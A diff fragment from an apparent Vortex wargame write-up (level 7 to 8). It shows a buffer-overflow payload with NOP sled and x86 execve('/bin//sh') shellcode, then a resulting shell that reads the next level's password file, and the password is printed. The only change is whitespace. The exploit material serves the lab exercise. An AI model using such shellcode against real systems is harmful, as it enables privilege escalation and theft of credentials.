@@ -126,9 +126,9 @@ using the brute force code (vortex7.c) we get (max runtime is about 50 mins - av
 "A"*74 + "\xb0\xd6\xff\xff"+"\x90" * 50+"\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x31\xd2\x31\xc9\xb0\x0b\xcd\x80"+"\x2f\x0b\x41\xb9"  
 
 we get:  
-$ whoami
-vortex8
-$ cat /etc/vortex_pass/vortex8
+$ whoami  
+vortex8  
+$ cat /etc/vortex_pass/vortex8  
 X70A_gcgl
 
 
